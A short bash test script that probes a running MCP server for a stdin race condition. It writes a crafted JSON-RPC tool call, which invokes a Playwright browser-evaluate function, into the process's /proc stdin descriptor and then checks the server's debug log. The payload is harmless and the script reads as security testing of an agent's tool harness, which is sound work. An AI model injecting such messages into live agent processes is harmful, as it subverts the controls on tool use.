#!/bin/bash
# Test 4: Race condition exploitation attempt

echo "=== TEST 4: Race Condition Exploitation ==="
echo ""

MCP_PID=$(pgrep -f "mcp/dist/index.js")
echo "Target PID: $MCP_PID"

echo ""
echo "Step 1: Check stdin redirection"
STDIN_TARGET=$(readlink /proc/$MCP_PID/fd/0)
echo "stdin points to: $STDIN_TARGET"

if [ "$STDIN_TARGET" = "/dev/null" ]; then
  echo "✓ stdin is /dev/null - cannot inject input"
  echo ""
  echo "=== RESULT: NOT EXPLOITABLE ==="
  echo "Reason: stdin is redirected to /dev/null"
  echo "Writing to /dev/null has no effect"
  echo "Race condition vulnerability: DOES NOT EXIST"
  exit 0
fi

echo ""
echo "Step 2: Create malicious MCP message"
cat > malicious_mcp.json << 'INNER_EOF'
{"jsonrpc":"2.0","id":999,"method":"tools/call","params":{"name":"playwright-browser_evaluate","arguments":{"function":"() => console.log('INJECTED')"}}}
INNER_EOF

echo "Step 3: Attempt to inject message"
echo "Writing to stdin..."
cat malicious_mcp.json > /proc/$MCP_PID/fd/0 2>&1
RESULT=$?

if [ $RESULT -eq 0 ]; then
  echo "⚠️  Write succeeded - vulnerability may exist"
else
  echo "✗ Write failed - not exploitable"
fi

echo ""
echo "Step 4: Check if message was processed"
sleep 1
echo "Checking logs..."
tail -5 /home/runner/work/_temp/cca-mcp-debug-logs/mcp-server.log 2>/dev/null || echo "Cannot access logs"
